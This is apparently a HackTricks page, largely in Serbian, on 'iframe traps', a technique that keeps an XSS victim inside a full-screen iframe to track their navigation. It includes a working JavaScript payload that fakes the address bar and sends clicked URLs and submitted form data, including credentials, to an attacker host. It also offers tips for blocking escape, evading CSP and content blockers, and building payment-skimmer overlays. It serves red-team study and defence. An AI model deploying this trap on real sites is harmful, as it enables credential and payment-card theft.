# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije

Ovaj oblik zloupotrebe XSS-a preko iframes za krađu informacija o kretanju korisnika po web stranici prvobitno je objavljen u ova 2 posta na trustedsec.com: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **and** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

Napad počinje na stranici ranjivoj na XSS gde je moguće da **victims don’t leave the XSS** tako što će se naterati da **navigate within an iframe** koji zauzima ceo web aplikaciju.

XSS napad će u suštini učitati web stranicu u iframe koji zauzima 100% ekrana. Dakle, žrtva **won't notice he is inside an iframe**. Zatim, ako žrtva navigira po stranici klikom na linkove unutar iframe-a (unutar weba), ona će **navigating inside the iframe** dok arbitrarni JS koji je učitan krade informacije iz te navigacije.

Štaviše, da bi to izgledalo realističnije, moguće je koristiti neke **listeners** koji proveravaju kada iframe menja lokaciju stranice i ažuriraju URL u browseru sa tim lokacijama tako da korisnik misli da koristi browser za prelaženje između stranica.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Takođe, moguće je koristiti listeners da se ukradu osetljive informacije — ne samo koje druge stranice žrtva posećuje, već i podaci iz **filled forms** koji se mogu poslati (credentials?) ili da se **steal the local storage**...

Naravno, glavna ograničenja su da će se žrtva izlaskom iz taba ili unosom drugog URL-a u browser osloboditi iframe-a. Drugi način je da osveži stranicu (**refresh the page**), međutim to se delimično može **prevented** onemogućenjem kontekst menija desnog klika svaki put kada se nova stranica učita unutar iframe-a ili detektovanjem kada miš korisnika napušta iframe (npr. da klikne dugme za reload u browseru) — u tom slučaju URL browsera se ažurira na originalni URL ranjiv na XSS pa će, ako korisnik reload-uje, stranica ponovo biti "poisoned" (napomena: ovo nije posebno stealth).

## Modernised trap (2024+)

* Use a **full‑viewport iframe** plus History/Navigation API to mimic real navigation.

<details>
<summary>Full-viewport iframe trap</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) sinhronizuje spoljašnju URL traku bez leaking the real URL.
* Idi u **fullscreen** da sakriješ browser UI i prikažeš sopstvenu lažnu address bar/padlock.

## Upotreba overlay‑a i skimmera

* Kompromitovani trgovci zamenjuju hostovane payment iframes (Stripe, Adyen, etc.) sa **pixel‑perfect overlay** koji prosleđuje keystroke‑ove dok je real frame ispod, ponekad koristeći legacy validation APIs tako da flow nikada ne puca.
* Zagrljavanje korisnika u top frame‑u hvata **autofill/password‑manager** podatke pre nego što primete da se URL traka nikada nije promenila.

## Trikovi za izbegavanje detekcije zapaženi u 2025 istraživanjima

* `about:blank`/`data:` lokalni frame‑ovi nasleđuju parent origin i zaobilaze neke content‑blocker heuristike; ugnježdeni iframes mogu se respawn‑ovati čak i kada ekstenzije ruše third‑party frameove.
* **Permission propagation**: prepisivanje parent `allow` atributa daje ugnježdenim attacker frameovima fullscreen/camera/microphone bez očiglednih DOM promena.

## Brzi OPSEC saveti

* Ponovo fokusiraj iframe kada miš napusti (`mouseleave` na body) da sprečiš korisnike da dopru do browser UI.
* Onemogući context menu i uobičajene prečice (`keydown` za `F11`, `Ctrl+L`, `Ctrl+T`) unutar frame‑a da usporiš pokušaje bekstva.
* Ako CSP blokira inline skripte, injektuj remote bootstrapper i omogući `srcdoc` na iframe‑u tako da tvoj payload živi izvan enforced CSP glavne stranice.

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
